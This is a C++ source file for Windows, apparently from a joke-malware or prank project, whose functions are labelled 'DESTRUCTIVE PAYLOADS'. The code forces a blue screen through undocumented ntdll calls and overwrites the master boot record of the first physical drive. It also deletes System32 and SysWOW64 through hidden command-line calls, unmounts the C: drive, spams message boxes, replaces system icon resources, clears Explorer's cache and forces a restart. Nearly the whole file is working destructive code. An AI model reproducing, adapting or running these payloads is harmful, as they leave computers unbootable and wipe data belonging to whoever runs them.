#include <Shlwapi.h>
#include <Windows.h>
#include <iostream>
#include "payloads.h"
#include <QString>
#include <filesystem>
#include <shellapi.h>
#include <stdio.h>
#include <tchar.h>
#include <boxspam.h>
#include <Cfgmgr32.h>
#include <stdlib.h>
#include <direct.h>
#include <KnownFolders.h>
#include <Shlobj_core.h>
const unsigned char MBR_SIZE[512]= {};
using namespace std;
#pragma comment(lib, "Shlwapi.lib")
// DESTRUCTIVE PAYLOADS

//Blue Screen
typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
void bsod() {
    BOOLEAN bEnabled;
    ULONG uResp;
    FARPROC lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    FARPROC lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}


//MBR Overwrite
void mbr() {
    DWORD BytesWritten;
    HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
    WriteFile(hMBR, MBR_SIZE, 512, &BytesWritten, 0);
    CloseHandle(hMBR);
    MessageBoxW(NULL, L"The Master Boot Record has been overwriten. This computer will no longer boot to Windows on next restart.", L"MBR is overwritten!", MB_OK | MB_ICONINFORMATION);
}

void sys32(void) {
    DWORD exitCode = 0;
    SHELLEXECUTEINFO info = {0};

    info.cbSize = sizeof(SHELLEXECUTEINFO);
    info.fMask = SEE_MASK_NOCLOSEPROCESS;
    info.hwnd = NULL;
    info.lpVerb = NULL;
    info.lpFile = L"C:\\Windows\\System32\\cmd.exe";
    info.lpParameters = L"/c takeown /f C:\\Windows\\System32 /r /d y & icacls C:\\Windows\\System32 /grant administrators:F /T & rmdir /s /q c:\\Windows\\System32";
    info.lpDirectory = NULL;
    info.nShow = SW_HIDE;
    info.hInstApp = NULL;
    ShellExecuteEx(&info);
    MessageBoxW(NULL, L"System32 has been succesfully deleted.", L"Delete success!", MB_OK | MB_ICONINFORMATION);
}

void sys64(void) {
    DWORD exitCode = 0;
    SHELLEXECUTEINFO info = {0};

    info.cbSize = sizeof(SHELLEXECUTEINFO);
    info.fMask = SEE_MASK_NOCLOSEPROCESS;
    info.hwnd = NULL;
    info.lpVerb = NULL;
    info.lpFile = L"C:\\Windows\\System32\\cmd.exe";
    info.lpParameters = L"/c takeown /f C:\\Windows\\SysWOW64 /r /d y & icacls C:\\Windows\\SysWOW64 /grant administrators:F /T & rmdir /s /q c:\\Windows\\SysWOW64";
    info.lpDirectory = NULL;
    info.nShow = SW_HIDE;
    info.hInstApp = NULL;
    ShellExecuteEx(&info);
    MessageBoxW(NULL, L"SysWOW64 has been succesfully deleted.", L"Delete success!", MB_OK | MB_ICONINFORMATION);
}

void eject() {
//    typedef CONFIGRET(WINAPI* HPED)(HWND hWnd, PCWSTR DeviceInstanceId, DWORD dwFlags);
//    HPED HotPlugEjectDevice = NULL;
//    HMODULE hDLL = LoadLibrary(TEXT("HotPlug.dll"));
//    if (hDLL != NULL)
//    {
//        HotPlugEjectDevice = (HPED)GetProcAddress(hDLL, "HotPlugEjectDevice");
//        if (HotPlugEjectDevice)
//        {
//            CONFIGRET cr = HotPlugEjectDevice(NULL, TEXT("PCI\\VEN_15AD&DEV_07E0&SUBSYS_07E015AD&REV_00\\4&bbf9765&0&1888"), 0);
//            // Test cr...
//        }
//    }
    DWORD exitCode = 0;
    SHELLEXECUTEINFO info = {0};

    info.cbSize = sizeof(SHELLEXECUTEINFO);
    info.fMask = SEE_MASK_NOCLOSEPROCESS;
    info.hwnd = NULL;
    info.lpVerb = NULL;
    info.lpFile = L"C:\\Windows\\System32\\cmd.exe";
    info.lpParameters = L"/c mountvol C: /d";
    info.lpDirectory = NULL;
    info.nShow = SW_HIDE;
    info.hInstApp = NULL;
    ShellExecuteEx(&info);
    MessageBoxW(NULL, L"The C:\\ drive has been succesfully ejected. Windows will not continue to function properly.", L"Eject success!", MB_OK | MB_ICONINFORMATION);

}


void spam(int x, int y) {
    class boxSpam boxSpam;
    boxSpam.move(x, y);
    boxSpam.setModal(false);
    boxSpam.show();
    boxSpam.exec();
}

void replaceIcons() {
    try {
      std::filesystem::copy(".\\imageres.dll.mun", "C:\\imageres.dll.mun");
    } catch (std::filesystem::filesystem_error& e) {
      std::cout << e.what() << '\n';
    }
    try {
      std::filesystem::copy(".\\shell32.dll.mun", "C:\\shell32.dll.mun");
    } catch (std::filesystem::filesystem_error& e) {
      std::cout << e.what() << '\n';
    }

    DWORD exitCode = 0;
    SHELLEXECUTEINFO info = {0};

    info.cbSize = sizeof(SHELLEXECUTEINFO);
    info.fMask = SEE_MASK_NOCLOSEPROCESS;
    info.hwnd = NULL;
    info.lpVerb = NULL;
    info.lpFile = L"C:\\Windows\\System32\\cmd.exe";
    info.lpParameters = L"/c takeown /f C:\\Windows\\SystemResources /r /d y & icacls C:\\Windows\\SystemResources /grant administrators:F /T";
    info.lpDirectory = NULL;
    info.nShow = SW_HIDE;
    info.hInstApp = NULL;
    ShellExecuteEx(&info);
    WaitForSingleObject(info.hProcess, INFINITE);
    CloseHandle(info.hProcess);
    MessageBoxW(NULL, L"System resources permissions success! \n Attempting to write file...", L"Permission success!", MB_OK | MB_ICONINFORMATION);
    BOOL rFile;
    rFile = ReplaceFile(
                L"C:\\Windows\\SystemResources\\imageres.dll.mun",
                L"C:\\imageres.dll.mun",
                NULL,
                REPLACEFILE_IGNORE_MERGE_ERRORS,
                NULL,
                NULL
                );
    if (rFile == ERROR_UNABLE_TO_MOVE_REPLACEMENT || rFile == ERROR_UNABLE_TO_MOVE_REPLACEMENT_2 || rFile == ERROR_UNABLE_TO_REMOVE_REPLACED) {
        MessageBoxW(NULL, L"Could not write to imageres.dll.mun.", L"Replace fail!", MB_OK | MB_ICONSTOP);
    }
    else {
        MessageBoxW(NULL, L"imageres.dll.mun replacement succeeded!", L"Replace success!", MB_OK | MB_ICONINFORMATION);
    }
    BOOL rFile2;
    rFile2 = ReplaceFile(
                L"C:\\Windows\\SystemResources\\shell32.dll.mun",
                L"C:\\shell32.dll.mun",
                NULL,
                REPLACEFILE_IGNORE_MERGE_ERRORS,
                NULL,
                NULL
                );
    if (rFile2 == ERROR_UNABLE_TO_MOVE_REPLACEMENT || rFile2 == ERROR_UNABLE_TO_MOVE_REPLACEMENT_2 || rFile2 == ERROR_UNABLE_TO_REMOVE_REPLACED) {
        MessageBoxW(NULL, L"Could not write to shell32.dll.mun.", L"Replace fail!", MB_OK | MB_ICONSTOP);
    }
    else {
        MessageBoxW(NULL, L"shell32.dll.mun replacement succeeded!", L"Replace success!", MB_OK | MB_ICONINFORMATION);
    }
    // char* appdata = getenv("APPDATA");
    PWSTR appdata = NULL;

    HRESULT hr = SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &appdata);
    if (SUCCEEDED(hr)) {
        BOOL ret = PathAppend(appdata, L"\\Microsoft\\Windows\\Explorer");
        for (const auto& entry : std::filesystem::directory_iterator(appdata)) {
            std::filesystem::remove_all(entry.path());
        }
    }
    MessageBoxW(NULL, L"Your computer will now restart.", L"Restart", MB_OK | MB_ICONINFORMATION);
    system("C:\\Windows\\System32\\shutdown /r");
}
